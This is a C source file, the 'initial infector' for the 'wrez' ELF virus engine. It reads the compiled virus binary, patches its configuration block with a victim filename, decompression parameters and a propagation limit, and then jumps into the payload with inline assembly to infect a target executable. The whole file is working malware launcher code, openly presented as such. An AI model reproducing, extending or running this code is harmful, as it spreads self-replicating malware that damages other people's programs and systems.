
/* initial infector which infects exactly one given binary with the virus
 * this is necessary because we only have the virus in raw binary form after
 * the build has taken place (i.e. no executeable elf file). so we have two
 * choices, either putting together a proper initial elf file, or executing
 * it as if it would already have infected a process (this one). the later is
 * easier, as we have to fixup some compression-related data in the raw data
 * anyway.
 */


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#pragma pack(1)
#include "wrconfig.h"

void usage (char *progname);

char *	configfile = "wrez.bin.conf";


void
usage (char *progname)
{
	fprintf (stderr, "usage: %s [-c config] [-i binary.out] <victim>\n"
		"\n", progname);

	exit (EXIT_FAILURE);
}


int
main (int argc, char *argv[])
{
	FILE *		bfp;
	char *		infile = "wrez.bin.out";
	long int	infile_len;
	unsigned char *	infile_data;
	unsigned int	cfg_delta,
			decomp_len;
	wrconfig *	cfg;
	wrdynconfig	dcfg;
	unsigned short	llstuff, hl2stuff, hf2stuff;
	char *		victim;

	char		c;
	char *		progname;
	FILE *		cfgfp;
	char		cfgline[128];
	char		lzstr[128];


	fprintf (stderr, "wrez engine - initial infector\n\n");

	progname = argv[0];
	if (argc < 2)
		usage (progname);

	while ((c = getopt (argc, argv, "c:i:")) != EOF) {
		switch (c) {
		case 'c':
			configfile = optarg;
			break;
		case 'i':
			infile = optarg;
			break;
		default:
			usage (progname);
			break;
		}
	}

	victim = argv[argc - 1];
	if (victim[0] == '-')
		usage (progname);

	/* read in configuration file
	 */
	cfgfp = fopen (configfile, "r");
	if (cfgfp == NULL) {
		perror ("fopen configfile");
		exit (EXIT_FAILURE);
	}

	while (fgets (cfgline, sizeof (cfgline), cfgfp) != NULL) {
		unsigned char	keyword[16];

		if (sscanf (cfgline, "%15[^ ]", keyword) != 1) {
			fprintf (stderr, "invalid configuration file\n");
			exit (EXIT_FAILURE);
		}

		/* XXX: kludge, put a better parser in here
		 */
		if (strcmp (keyword, "configrel") == 0) {
			if (sscanf (cfgline, "configrel %u", &cfg_delta) != 1) {
				fprintf (stderr, "invalid configrel\n");
				exit (EXIT_FAILURE);
			}
		} else if (strcmp (keyword, "skip") == 0) {
			if (sscanf (cfgline, "skip %u", &decomp_len) != 1) {
				fprintf (stderr, "invalid skip\n");
				exit (EXIT_FAILURE);
			}
		} else if (strcmp (keyword, "compress") == 0) {
			if (sscanf (cfgline, "compress %127s", lzstr) != 1) {
				fprintf (stderr, "invalid compress\n");
				exit (EXIT_FAILURE);
			}
		} else {
			fprintf (stderr, "invalid configuration file\n");
			exit (EXIT_FAILURE);
		}
	}

	if (strlen (victim) >= sizeof (cfg->dyn.vinit.victim)) {
		fprintf (stderr, "temporary victim filename can be no longer "
			"than %d characters, yours is %d chars.\n",
			sizeof (cfg->dyn.vinit.victim) - 1,
			strlen (victim));

		exit (EXIT_FAILURE);
	}

	bfp = fopen (infile, "rb");
	if (bfp == NULL) {
		perror ("fopen");

		exit (EXIT_FAILURE);
	}

	fseek (bfp, 0, SEEK_END);
	infile_len = ftell (bfp);
	fseek (bfp, 0, SEEK_SET);

	infile_data = calloc (1, infile_len + 64 * 1024 + 2);
	infile_data[0] = 0x9c;	/* pushf */
	infile_data[1] = 0x60;	/* pusha */

	if (fread (infile_data + 2, 1, infile_len, bfp) != infile_len) {
		fprintf (stderr, "failed to read %s into memory, expected %ld "
			"bytes, got less.\n", infile, infile_len);
		exit (EXIT_FAILURE);
	}
	fclose (bfp);

	printf ("# successfully read %ld bytes into memory\n", infile_len);
	printf ("# fixing configuration structure\n");


	/* get new configuration structure, and change important settings:
	 *
	 * wr_start = virtual address of first byte of virus (dynamic)
	 * decomp_len = length of the decompression stub (static)
	 * victim = first-infection victim filename (dynamic), later used
	 *     for flag data, see wrconfig.h
	 * cmprlen, llstuff, hl1stuff, hl2stuff, hf2stuff = decompression
	 *     related data used by the decompression stub (static)
	 */
	cfg = (wrconfig *) (&infile_data[2] + cfg_delta);

	printf ("# .. wr_start [0x%08lx] -> ", cfg->wr_start);
	cfg->wr_start = (unsigned long int) &infile_data[2];
	printf ("[0x%08lx]\n", cfg->wr_start);

	printf ("# .. decomp_len [%ld] -> ", cfg->decomp_len);
	cfg->decomp_len = decomp_len;
	printf ("[%ld]\n", cfg->decomp_len);

	printf ("# .. elf_base [0x%08lx] -> ", cfg->elf_base);
	cfg->elf_base = 0x08048000;	/* XXX: kludge, hardcoded values */
	printf ("[0x%08lx]\n", cfg->elf_base);

	printf ("# .. dyn.vinit.victim[%d] \"%s\" -> ",
		sizeof (cfg->dyn.vinit.victim),
		cfg->dyn.vinit.victim);
	memcpy (cfg->dyn.vinit.victim, victim, strlen (victim) + 1);
	printf ("\"%s\" (%d + 1 bytes)\n", cfg->dyn.vinit.victim,
		strlen (victim));

	/* TODO: initialize dcfg structure
	 */
	dcfg.cnul = 0x00;
	dcfg.flags = 0;
	WRF_SET (dcfg.flags, WRF_GENERATION_LIMIT);
	dcfg.icount = 3;	/* three propagations, then infertile */
	WRF_SET (dcfg.flags, WRF_GET_FINGERPRINT);
	memcpy (dcfg.xxx_temp, "victim", 7);

	if (sizeof (wrdynconfig) > (VICTIM_LEN + sizeof (void *))) {
		fprintf (stderr, "FATAL: sizeof wrdynconfig exceeds space: "
			"%d > %d\n", sizeof (wrdynconfig), (VICTIM_LEN +
			sizeof (void *)));

		exit (EXIT_FAILURE);
	}

	printf ("# .. dyn.vinit.vcfgptr [0x%08lx] -> ",
		(unsigned long int) cfg->dyn.vinit.vcfgptr);
	cfg->dyn.vinit.vcfgptr = &dcfg;
	printf ("[0x%08lx]\n", (unsigned long int) cfg->dyn.vinit.vcfgptr);

	if (sscanf (lzstr, "%lu:%hu:%hu:%hu:%hu",
		&cfg->cmprlen, &llstuff, &cfg->hl1stuff, &hl2stuff,
		&hf2stuff) != 5)
	{
		fprintf (stderr, "failed to parse huffman string: %s\n",
			argv[3]);

		exit (EXIT_FAILURE);
	}
	cfg->llstuff = llstuff;
	cfg->hl2stuff = hl2stuff;
	cfg->hf2stuff = hf2stuff;

	printf ("# .. cmprlen\tllstuff\thl1st\thl2st\thf2st\n");
	printf ("#    0x%04lx\t0x%02x\t0x%04x\t0x%02x\t0x%02x\n",
		cfg->cmprlen, cfg->llstuff, cfg->hl1stuff, cfg->hl2stuff,
		cfg->hf2stuff);

	printf ("# fixed, ready to infect.\n");

	/* 0x83 0xc3 0xfc 0x83 = add $0xfffffffc, %ebx */
	__asm__ __volatile__ (
		"call	*%%eax\n"
		"add	$0xfffffffc, %%ebx\n"
		: : "a" (infile_data), "b" (infile_data));

	printf ("# infected.\n");

	exit (EXIT_SUCCESS);
}



